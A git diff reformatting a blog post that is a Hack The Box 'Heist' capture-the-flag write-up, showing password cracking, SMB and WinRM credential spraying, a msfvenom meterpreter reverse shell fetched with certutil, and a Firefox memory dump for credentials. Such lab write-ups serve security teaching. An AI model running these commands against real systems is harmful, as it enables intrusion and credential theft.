@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Heist"
-date:   2019-12-02 00:27:00 +0800
-categories: hackthebox
-tags: windows winrm memorydump
+title: Hack The Box - Heist
+date: 2019-12-02 00:27:00 +0800
+categories: [hackthebox]
+tags: [windows, winrm, memorydump]
 ---
 
 ![](/assets/images/heist.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating system that I will be using to tackle this machine is a Kali Linux
 
 Always remember to map a domain name to the machine's IP address to ease your rooting !
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.149 heist.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC heist.htb
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-17 10:31 EDT
 Nmap scan report for heist.htb (10.10.10.149)
@@ -52,7 +51,7 @@ Host script results:
 |_  start_date: N/A
 5985/tcp  open  wsman
 49669/tcp open  unknown
-{% endhighlight %}
+```
 
 Lets first check out the `http` service on port 80.
 
@@ -122,7 +121,7 @@ enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
 ```  
 which has a Type 5 encrypted password. To crack it, I will be using this [tool](https://github.com/axcheron/cisco_pwdecrypt).
 
-{% highlight bash %}
+```bash
 $ python3 cisco_pwdecrypt.py -u "\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91" -d /usr/share/wordlists/rockyou.txt
 [*] Bruteforcing 'type 5' hash...
 
@@ -135,7 +134,7 @@ $ python3 cisco_pwdecrypt.py -u "\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91" -d /usr/shar
 	[Status] 132/14344392 password tested...
 
 [*] Password Found = stealth1agent
-{% endhighlight %}
+```
 
 Lastly, we have  
 ```
@@ -144,13 +143,13 @@ username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
 ```
 which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool.
 
-{% highlight bash %}
+```bash
 $ python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713
 [*] Result: $uperP@ssword
 
 $ python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408
 [*] Result: Q4)sJu\Y8qz*A3?d
-{% endhighlight %}
+```
 
 With all the credentials we have collected so far, lets create 2 files to store them.  
 
@@ -171,7 +170,7 @@ Q4)sJu\Y8qz*A3?d
 
 With some credentials, lets move on to the `smb` service on port 445. I will be using the `auxiliary/scanner/smb/smb_login` module in Metasploit to test the different combinations.
 
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > use auxiliary/scanner/smb/smb_login
 msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS heist.htb
@@ -190,10 +189,10 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [+] 10.10.10.149:445      - 10.10.10.149:445 - Success: '.\hazard:stealth1agent'
 [*] heist.htb:445         - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-{% endhighlight %}
+```
 
 Using `hazard:stealth1agent`, lets see what we can access in the `smb` shares!
-{% highlight bash %}
+```bash
 $ smbmap -H heist.htb -u hazard -p stealth1agent
 [+] Finding open SMB ports....
 [+] User SMB session establishd on heist.htb...
@@ -203,10 +202,10 @@ $ smbmap -H heist.htb -u hazard -p stealth1agent
 	ADMIN$                                            	NO ACCESS
 	C$                                                	NO ACCESS
 	IPC$                                              	READ ONLY
-{% endhighlight %}
+```
 
 I guess the `smb` service is a dead end? Maybe not. Using [Impacket](https://github.com/SecureAuthCorp/impacket)'s `lookupsid.py`, we are able to enumerate for other users on the machine.
-{% highlight bash %}
+```bash
 $ python lookupsid.py Hazard:stealth1agent@heist.htb
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 [*] Brute forcing SIDs at 10.10.10.149
@@ -221,7 +220,7 @@ Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 1009: SUPPORTDESK\support (SidTypeUser)
 1012: SUPPORTDESK\Chase (SidTypeUser)
 1013: SUPPORTDESK\Jason (SidTypeUser)
-{% endhighlight %}
+```
 
 From this, we are able to find out that the domain is `SUPPORTDESK`. With these new users, lets update our `user.txt`.
 ```
@@ -236,7 +235,7 @@ Administrator
 ```
 
 And run the `auxiliary/scanner/smb/smb_login` module again.
-{% highlight bash %}
+```bash
 msf5 auxiliary(scanner/smb/smb_login) > set DOMAIN SUPPORTDESK
 DOMAIN => SUPPORTDESK
 msf5 auxiliary(scanner/smb/smb_login) > run
@@ -246,11 +245,11 @@ msf5 auxiliary(scanner/smb/smb_login) > run
 [+] 10.10.10.149:445      - 10.10.10.149:445 - Success: 'SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d'
 [*] heist.htb:445         - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-{% endhighlight %}
+```
 
 Alright! We got another set of credentials! Lets try to access the `smb` shares using `Chase:Q4)sJu\Y8qz*A3?d`!
 
-{% highlight bash %}
+```bash
 $ smbmap -H heist.htb -u Chase -p "Q4)sJu\Y8qz*A3?d" -d SUPPORTDESK
 [+] Finding open SMB ports....
 [+] User SMB session establishd on heist.htb...
@@ -260,13 +259,13 @@ $ smbmap -H heist.htb -u Chase -p "Q4)sJu\Y8qz*A3?d" -d SUPPORTDESK
 	ADMIN$                                            	NO ACCESS
 	C$                                                	NO ACCESS
 	IPC$                                              	READ ONLY
-{% endhighlight %}
+```
 
 Still nothing? I guess the `smb` service really is a dead end :(
 
 If we go back to our reconnaissance results, there is actually one more service on port 5985: `wsman`. After some research, the `wsman` service is the `WinRM` service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the `auxiliary/scanner/winrm/winrm_login` module in Metasploit.
 
-{% highlight bash %}
+```bash
 msf5 auxiliary(scanner/smb/smb_login) > use auxiliary/scanner/winrm/winrm_login
 msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS heist.htb
 RHOSTS => heist.htb
@@ -285,12 +284,12 @@ msf5 auxiliary(scanner/winrm/winrm_login) > run
 [+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\Chase:Q4)sJu\Y8qz*A3?d
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-{% endhighlight %}
+```
 
 # user.txt
 
 Okay... So the same `Chase` user have access to both the `smb` and `WinRM` service. To establish a shell, I used  `Alamot`'s [winrm_shell.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb) with the following configuration settings:
-{% highlight ruby %}
+```ruby
 require 'winrm'
 conn = WinRM::Connection.new( 
   endpoint: 'http://10.10.10.149:5985/wsman',
@@ -299,11 +298,11 @@ conn = WinRM::Connection.new(
   password: 'Q4)sJu\Y8qz*A3?d',
   :no_ssl_peer_verification => true
 )
-{% endhighlight %}
+```
 
 And now we execute the `WinRM` shell...
 
-{% highlight bash %}
+```bash
 $ ruby winrm_shell.rb
 PS supportdesk\chase@SUPPORTDESK Documents> cd ..
 PS supportdesk\chase@SUPPORTDESK Chase> cd Desktop
@@ -317,14 +316,14 @@ Mode                LastWriteTime         Length Name
                                                                                                                    
 PS supportdesk\chase@SUPPORTDESK Desktop> more user.txt
 a127XXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # root.txt (1)
 
 When I first did this machine, I found the `SHA-256` hash of the Administrator's password which I was able to somehow crack it using an online website.
 
 From what we know, there was a `IIS` web server running on port 80 so I checked out `C:\inetpub\wwwroot`. 
-{% highlight bash %}
+```bash
 PS supportdesk\chase@SUPPORTDESK inetpub> dir
  Volume in drive C has no label.
  Volume Serial Number is 78E3-E62D
@@ -343,10 +342,10 @@ PS supportdesk\chase@SUPPORTDESK inetpub> dir
 04/22/2019  06:48 AM             2,657 login.php
                4 File(s)          7,210 bytes
                6 Dir(s)   7,923,224,576 bytes free
-{% endhighlight %}
+```
 
 I skimmed through the pages until I came across `login.php`.
-{% highlight php %}
+```php
 <?php
 session_start();
 if( isset($_REQUEST['login']) && !empty($_REQUEST['login_username']) && !empty($_REQUEST['login_password'])) {
@@ -365,12 +364,12 @@ else if( isset($_GET['guest']) ) {
         }
 }
 ?>
-{% endhighlight %}
+```
 
 The `SHA-256` hash of the admin's password was hardcoded in `login.php`. I immediately tried different online password cracking websites until I came across this [website](https://md5decrypt.net/en/Sha256). I supplied the hash and got the password `4dD!5}x/re8]FBuZ`.
 
 Using [Impacket](https://github.com/SecureAuthCorp/impacket)'s `psexec.py`, I was able to establish a shell.
-{% highlight bash %}
+```bash
 $ python psexec.py Administrator:'4dD!5}x/re8]FBuZ'@heist.htb
 Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
 
@@ -391,24 +390,24 @@ C:\Windows\system32>cd C:\Users\Administrator\Desktop
 
 C:\Users\Administrator\Desktop>more root.txt
 50dfXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # root.txt (2)
 
 So apparently there was another or more "proper" way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell.
 
 To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the `SimpleHTTPServer` is running from.
-{% highlight bash %}
+```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XXX.XXX LPORT=1337 -f exe > shell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
 Final size of exe file: 73802 bytes
-{% endhighlight %}
+```
 
 And we start our listener on port 1337...
-{% highlight bash %}
+```bash
 $ msfconsole
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -420,28 +419,28 @@ LHOST => 10.10.14.61
 msf5 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.10.XXX.XXX:1337
-{% endhighlight %}
+```
 
 Back to our `WinRM` shell, we retrieve the executable from our `SimpleHTTPServer` using `certutil.exe` and run it.
-{% highlight bash %}
+```bash
 PS supportdesk\chase@SUPPORTDESK Chase> certutil.exe -urlcache -split -f http://10.10.XXX.XXX/shell.exe
 ****  Online  ****
   000000  ...
   01204a
 CertUtil: -URLCache command completed successfully.
 PS supportdesk\chase@SUPPORTDESK Documents> cmd.exe /k shell.exe
-{% endhighlight %}
+```
 
 Back on our listener, we obtained a meterpreter shell.
-{% highlight bash %}
+```bash
 [*] Sending stage (179779 bytes) to 10.10.10.149
 [*] Meterpreter session 1 opened (10.10.XXX.XXX:1337 -> 10.10.10.149:49694) at 2019-08-31 09:04:09 -0400
 
 meterpreter >
-{% endhighlight %}
+```
 
 When we list all the processes running on the box using the `ps` command, we noticed that `firefox.exe` is currently running.
-{% highlight bash %}
+```bash
 meterpreter > ps
 Process List
 ============
@@ -453,19 +452,19 @@ Process List
 2264  796   firefox.exe                x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
 5912  796   firefox.exe                x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
 6068  796   firefox.exe                x64   1        SUPPORTDESK\Chase  C:\Program Files\Mozilla Firefox\firefox.exe
-{% endhighlight %}
+```
 
 Lets try to dump out the process's memory to see if we can extract any credentials! I will be using [Sysinternals](https://live.sysinternals.com/)'s `procdump.exe`. Since we already have a meterpreter shell, we can just use the `upload` command to transfer it over.
-{% highlight bash %}
+```bash
 meterpreter > upload procdump.exe
 [*] uploading  : procdump.exe -> procdump.exe
 [*] Uploaded 636.16 KiB of 636.16 KiB (100.0%): procdump.exe -> procdump.exe
 [*] uploaded   : procdump.exe -> procdump.exe
-{% endhighlight %}
+```
 
 Next up, we spawn a `cmd.exe` shell and run `procdump.exe` on the `firefox.exe` process.
 
-{% highlight bash %}
+```bash
 meterpreter > shell
 Process 3708 created.
 Channel 102 created.
@@ -483,17 +482,17 @@ Sysinternals - www.sysinternals.com
 [19:30:24] Dump 1 writing: Estimated dump file size is 473 MB.
 [19:30:29] Dump 1 complete: 474 MB written in 5.2 seconds
 [19:30:29] Dump count reached.
-{% endhighlight %}
+```
 
 With that done, we exit out of our `cmd.exe` and use the `download` command to retrieve the process dump.
-{% highlight bash %}
+```bash
 C:\Users\Chase>exit
 exit
 meterpreter > download C:\\Users\\Chase\\firefox.exe_190831_193023.dmp
 [*] Downloading: C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
 [*] Downloaded 462.05 MiB of 462.05 MiB (100.0%): C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
 [*] download   : C:\Users\Chase\firefox.exe_190831_193023.dmp -> firefox.exe_190831_193023.dmp
-{% endhighlight %}
+```
 
 The final step is simply to run `strings` on it and `grep` for `password`. There were many lines containing `password` but I came across this line:
 ```
@@ -502,4 +501,4 @@ The final step is simply to run `strings` on it and `grep` for `password`. There
 
 The password seems to be the value for `login_password`. Refer to `root.txt (1)` on how to establish a shell using the credentials we found.
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
